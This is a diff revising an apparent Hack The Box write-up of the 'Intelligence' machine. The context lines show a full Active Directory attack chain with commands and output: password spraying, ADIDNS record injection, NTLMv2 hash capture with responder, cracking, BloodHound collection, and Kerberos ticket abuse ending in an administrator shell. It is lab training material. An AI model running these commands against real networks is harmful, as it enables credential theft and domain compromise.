@@ -18,7 +18,7 @@ tags:
 
 The [Intelligence](https://app.hackthebox.com/machines/Intelligence) machine has been created by [Micah](https://app.hackthebox.com/users/22435). This is a **medium** Windows Machine with a strong focus on Active Directory enumeration and exploitation. This box is really interesting, it shows some exploitation paths that are not always common like ADIDNS abuse or GMSA passwords.
 
-If you didn't solve this challenge and just look for answers, first, you should take a look at this [mind map](https://github.com/Orange-Cyberdefense/arsenal/blob/master/mindmap/pentest_ad_dark.png?raw=true) from [Orange Cyberdefense](https://github.com/Orange-Cyberdefense) and try again. It could give you some hints about interesting attack paths when dealing with an Active Directory.
+If you didn't solve this challenge and just look for answers, first, you should take a look at this [mind map](https://github.com/Orange-Cyberdefense/ocd-mindmaps/blob/main/img/pentest_ad_dark_2023_02.svg) from [Orange Cyberdefense](https://github.com/Orange-Cyberdefense) and try again. It could give you some hints about interesting attack paths when dealing with an Active Directory.
 {: .text-justify}
 
 ![image-center](/images/htb/htb_intelligence_infocard.png){: .align-center}
@@ -59,7 +59,7 @@ PORT    STATE SERVICE       VERSION
 Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
 
-**Remember:** By default, **Nmap** only target the 1000 most common ports. You can find the full list here: [https://github.com/nmap/nmap/blob/master/nmap-services](https://github.com/nmap/nmap/blob/master/nmap-services). However, they are sorted by port numbers, not by open frequency.
+**Remember:** By default, **Nmap** will scans the 1000 most common TCP ports on the targeted host(s). Make sure to read the [documentation](https://nmap.org/docs.html) if you need to scan more ports or change default behaviors.
 {: .notice--warning}
 
 As we can see, the machine seems to be a domain controller for **intelligence.htb** and we have a few interesting services including a Web server running on TCP/80.
@@ -190,13 +190,13 @@ Here you can redirect the output to a file in order to produce a list of usernam
 
 # Initial Access
 
-We got a list of usernames and one password, let's see what we can do with that.
+In a real-world scenario, adversaries may search network shares on computers they have compromised to find files of interest. Sensitive data can be collected from remote systems via shared network drives. Here, we got a list of usernames and one password, let's see what we can do with that.
 
 ## Password Spraying
 
 As stated by [MITRE](https://attack.mitre.org/techniques/T1110/003/), adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password, or a small list of commonly used passwords, that may match the complexity policy of the domain.
 
-Since we have a list of usernames and a potential password, we can use [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec), to see if one of the accounts is using the password we discovered earlier. Note that we use the `--continue-on-success` to make sure that `crackmapexec` will go through the entire list of usernames, even if a valid account is discovered.
+Since we have a list of usernames and a potential password, we can use [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec), to see if one of the accounts is using the password we discovered earlier. Note that we used the `--continue-on-success` to make sure that `crackmapexec` will go through the entire list of usernames, even if a valid account is discovered.
 
 ```bash
 $ crackmapexec smb 10.129.95.154 -u users.txt -p NewIntelligenceCorpUser9876 --continue-on-success
@@ -218,7 +218,7 @@ We found a valid account (`Tiffany.Molina:NewIntelligenceCorpUser9876`). However
 
 ## Shared Folders
 
-Again, with `crackmapexec` and the `--shares` switch, we can see if **tiffany.molina** has any permissions on potential remote shares.
+Again, with `crackmapexec` and the `--shares` switch, we can see if **tiffany.molina** has READ permissions on some remote shares.
 
 ```bash
 $ crackmapexec smb 10.129.95.154 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 --shares
@@ -236,7 +236,7 @@ SMB         10.129.95.154   445    DC               SYSVOL          READ        
 SMB         10.129.95.154   445    DC               Users           READ        
 ```
 
-Nice ! Using another tool, [impacket-smbclient](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbclient.py), we can read the content of **Tiffany.Molina** user folder and grab the **first flag**.
+Nice! Using another tool, [impacket-smbclient](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbclient.py), we can read the content of **Tiffany.Molina** user folder and grab the **first flag**.
 
 ```bash
 $ impacket-smbclient Tiffany.Molina:NewIntelligenceCorpUser9876@10.129.95.154
@@ -280,7 +280,7 @@ According to the MITRE, [Privilege Escalation](https://attack.mitre.org/tactics/
 
 ## ADIDNS Abuse
 
-If found an interesting [post](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/adidns-spoofing) about ADIDNS abuse. Basically, AD services need DNS to work properly. So, Active Directory Domain Services offer an integrated storage and replication service for DNS records called Active Directory Integrated DNS (ADIDNS). 
+We found an interesting [post](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/adidns-spoofing) about ADIDNS abuse. Basically, AD services need DNS to work properly. So, Active Directory Domain Services offer an integrated storage and replication service for DNS records called Active Directory Integrated DNS (ADIDNS). 
 
 Since ADIDNS zone DACL (Discretionary Access Control List) enables regular users to create child objects by default, we can leverage this permission and create arbitrary DNS records that points to our own IP address. 
 
@@ -295,7 +295,7 @@ $ python3 dnstool.py -u "intelligence\Tiffany.Molina" -p NewIntelligenceCorpUser
 [+] LDAP operation completed successfully
 ```
 
-Then, using [responder](https://github.com/lgandx/Responder), an LLMNR, NBT-NS and MDNS poisoner, we were able to capture a hash for the **amanda** account.
+Then, using [responder](https://github.com/lgandx/Responder), an LLMNR, NBT-NS and MDNS poisoner, we were able to capture a hash for the **ted.graves** account.
 
 ```bash
 $ sudo responder -I tun0
@@ -308,6 +308,8 @@ $ sudo responder -I tun0
 [HTTP] NTLMv2 Username : intelligence\Ted.Graves
 [HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:4f18ec29602f5b50:D412F532F59E21498967A5A1DEC544C3:0101000000000000F8EE1A5F387DD801E2BBA8D36D879177000000000200080031004B004D00340001001E00570049004E002D0031003500500039003000560046004F003600460048000400140031004B004D0034002E004C004F00430041004C0003003400570049004E002D0031003500500039003000560046004F003600460048002E0031004B004D0034002E004C004F00430041004C000500140031004B004D0034002E004C004F00430041004C0008003000300000000000000000000000002000005B3DEC70843423B3A43537C3C99170AE0C4E334BB2D989E60634D882103F66460A001000000000000000000000000000000000000900340048005400540050002F0077006500620031002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000  
 ```
+
+Let's see if we can crack this password.
 
 ## Password Cracking
 
@@ -331,9 +333,11 @@ Use the "--show --format=netntlmv2" options to display all of the cracked passwo
 Session completed.
 ```
 
+Nice, we have a cleartext password.
+
 ## Active Directory Recon
 
-With a valid account, we can now use one of the [BloodHound](https://github.com/BloodHoundAD/BloodHound) ingestors and gather more information about the Active Directory. BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory or Azure environment. 
+With this new compromised, we can now use one of the [BloodHound](https://github.com/BloodHoundAD/BloodHound) ingestors and gather more information about the Active Directory. BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory or Azure environment. 
 
 Attackers can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify. Here, we used a Python based ingestor for BloodHound, [BloodHound.py](https://github.com/fox-it/BloodHound.py).
 
@@ -356,7 +360,7 @@ INFO: Done in 00M 07S
 INFO: Compressing output into 20220610151445_bloodhound.zip
 ```
 
-Now, you can import the generated file (*20220204141002_bloodhound.zip*) in BloodHound by running `sudo neo4j console`, then execute BloodHound in another terminal with the `bloodhound` command. 
+Now, you can import the generated file (*20220204141002_bloodhound.zip*) in BloodHound by running `sudo neo4j start`, then execute BloodHound in another terminal with the `bloodhound` command. 
 
 ![image-center](/images/htb/htb_intelligence_bloodhound.png){: .align-center}
 
@@ -401,7 +405,9 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 [*] Saving ticket in Administrator.ccache
 ```
  
-Nice, we have a ticket, we can export it with `export KRB5CCNAME=Administrator.ccache` and use it with [impacket-wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py). Note that you will need to add `10.129.95.154 dc.intelligence.htb` to your **/etc/hosts** file as the `-k` switch will use our credentials from ccache file (KRB5CCNAME) and it needs the FQDN.
+Nice, we have a ticket, we can export it with `export KRB5CCNAME=Administrator.ccache` and use it with [impacket-wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py) to grab the **second flag**.
+
+Note that you will need to add `10.129.95.154 dc.intelligence.htb` to your **/etc/hosts** file as the `-k` switch will use our credentials from ccache file (KRB5CCNAME) and it needs the FQDN.
 
 ```bash
 $ impacket-wmiexec -k -no-pass dc.intelligence.htb
@@ -426,6 +432,4 @@ C:\>dir c:\users\administrator\desktop
                2 Dir(s)   5,975,379,968 bytes free
 ```
 
-Great, we can now grab our **second flag**.
-
-Awesome ! I hope you enjoyed it, I know I did :)
+Awesome! I hope you enjoyed it, I know I did :)
